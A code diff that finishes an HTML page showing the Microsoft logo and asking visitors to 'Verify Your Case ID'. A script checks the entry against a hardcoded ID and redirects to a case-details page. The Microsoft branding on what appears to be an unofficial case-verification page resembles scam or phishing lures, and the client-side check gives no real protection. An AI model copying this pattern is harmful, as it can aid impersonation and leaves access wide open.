@@ -32,6 +32,7 @@
             border: 1px solid #ccc;
             border-radius: 5px;
             font-size: 16px;
+            text-align: center;
         }
         button {
             width: 100%;
@@ -55,4 +56,21 @@
     <div class="container">
         <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" alt="Microsoft Logo" class="logo">
         <h2>Verify Your Case ID</h2>
-        <p>Please enter your Case ID number to continue</p
+        <p>Please enter your Case ID number to continue</p>
+        <input type="text" id="caseId" placeholder="Enter Case ID" required>
+        <button onclick="verifyCase()">Continue</button>
+    </div>
+
+    <script>
+        function verifyCase() {
+            let caseId = document.getElementById("caseId").value.trim();
+            if (caseId === "656781") {
+                window.location.href = "case-details.html";
+            } else {
+                alert("Invalid Case ID. Please enter a valid Case ID.");
+            }
+        }
+    </script>
+
+</body>
+</html>
